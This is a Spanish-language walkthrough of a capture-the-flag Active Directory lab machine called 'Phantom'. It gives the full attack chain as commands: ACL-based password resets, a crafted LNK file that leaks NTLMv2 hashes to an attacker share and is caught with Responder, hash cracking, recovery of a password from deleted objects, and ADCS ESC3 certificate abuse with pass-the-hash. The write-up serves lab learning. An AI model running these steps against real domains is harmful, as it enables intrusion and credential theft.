---
tags: [ctf, thehackerslabs, windows, walkthrough, active-directory]
tipo: walkthrough
estado: resuelto
---

# Phantom — Walkthrough

> [!note] Documento de detalle
> El **walkthrough completo con todas las salidas** está en [[Phantom - Roadmap]]. Aquí se resumen los pasos con su interpretación.

## Paso 0 — Problema previo de red

**Comando**
```bash
VBoxManage dhcpserver modify --network=HostInterfaceNetworking-vboxnet0 \
  --server-ip=192.168.56.2 --lower-ip=192.168.56.101 --upper-ip=192.168.56.254 \
  --netmask=255.255.255.0 --enable
VBoxManage dhcpserver restart --network=HostInterfaceNetworking-vboxnet0
```

**Interpretación / por qué**
- La VM recibía APIPA `169.254.124.106`: el DHCP de VirtualBox usaba la **misma** `192.168.56.100` que la IP fija de la VM. Mover el DHCP lo resuelve.

## Paso 1 — Reconocimiento

**Comando**
```bash
nmap -Pn -sCV -p- 192.168.56.100
netexec smb 192.168.56.100 -u '' -p ''
```

**Interpretación / por qué**
- Puertos típicos de **DC**. Null Auth conecta pero **no** permite listar shares ni RID-brute; se necesitan credenciales (las da el enunciado: `mark`).

## Paso 2 — Pivoting por ACLs (mark → bob → frank)

**Comando**
```bash
bloodhound-python -u mark -p 'suP3rPa$sw0rd2026!&' -d PHANTOM.THL -dc dc01.phantom.thl -ns 192.168.56.100 -c All --zip
net rpc password bob 'P3rr0Verde$2026!xYz' -U 'PHANTOM.THL/mark%suP3rPa$sw0rd2026!&' -S 192.168.56.100
net rpc password frank 'Fr@nkN3w$2026!xYz' -U 'PHANTOM.THL/bob%P3rr0Verde$2026!xYz' -S 192.168.56.100
evil-winrm -i 192.168.56.100 -u frank -p 'Fr@nkN3w$2026!xYz'
```

**Interpretación / por qué**
- **GenericAll / WriteDACL / ForceChangePassword**: permisos AD que permiten tomar control de otros objetos.
- La política de contraseñas rechaza credenciales débiles → usar largas y complejas.

## Paso 3 — NTLM theft → robert → USER FLAG

**Comando**
```bash
python3 -c "import pylnk3; l=pylnk3.create('config.lnk'); l.icon=r'\\\\192.168.56.1\\share\\x.ico'; l.work_dir=r'\\\\192.168.56.1\\share'; l.save()"
sudo responder -I vboxnet0 -wv
smbclient "//192.168.56.100/Dev Tools" -U 'PHANTOM.THL/frank%Fr@nkN3w$2026!xYz' -c 'put config.lnk config.lnk'
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt robert.hash   # robert : bLink182
evil-winrm -i 192.168.56.100 -u robert -p 'bLink182'
```

**Interpretación / por qué**
- El share **Dev Tools** es escribible y una tarea de `robert` lo visita → al cargar el icono desde el UNC, se captura **NTLMv2** con Responder. Crackear → `robert`.
- Pista en `migration_notes.txt` → cuentas de prueba y certificados internos.

## Paso 4 — Tombstones → tomas

**Comando**
```python
# LDAP con control show-deleted (1.2.840.113556.1.4.417), filtro (isDeleted=TRUE)
# -> CN=dev_test\0ADEL ... description = f6Y%UPa6ZB9eR5wG9$an
```
```bash
netexec smb 192.168.56.100 -u users.txt -p 'f6Y%UPa6ZB9eR5wG9$an' --continue-on-success
```

**Interpretación / por qué**
- Objetos eliminados (**tombstones**) conservan atributos, incluida la contraseña en `description`; se reutiliza para `tomas`.

## Paso 5 — ADCS ESC3 → Administrador → ADMIN FLAG

**Comando**
```bash
certipy-ad find -u tomas@phantom.thl -p 'f6Y%UPa6ZB9eR5wG9$an' -dc-ip 192.168.56.100 -vulnerable -stdout
certipy-ad req -u tomas@phantom.thl -p '...' -ca PHANTOM-DC01-CA -template Phantom-DevAuth
certipy-ad req -u tomas@phantom.thl -p '...' -ca PHANTOM-DC01-CA -template User \
  -on-behalf-of 'PHANTOM\Administrador' -pfx tomas.pfx -out administrador
certipy-ad auth -pfx administrador.pfx -dc-ip 192.168.56.100
netexec winrm 192.168.56.100 -u Administrador -H dda94fc1fe08ac45c2cc490404651162
```

**Interpretación / por qué**
- La plantilla **Phantom-DevAuth** tiene EKU *Certificate Request Agent* → **ESC3**: se pide un certificado **en nombre de** Administrador, se autentica por **PKINIT** y se obtiene su hash NT para **Pass-the-Hash**.

## Qué funcionó

- BloodHound para la ruta de ACLs.
- LNK + Responder para NTLM theft.
- Tombstones y reutilización.
- ADCS ESC3 + PKINIT + PtH.

## Qué falló (y por qué)

- Null session para enumerar shares/RID: bloqueado sin credenciales.

## Qué aprendí

- Encadenar ACLs de AD, NTLM theft, tombstones y ADCS ESC3.
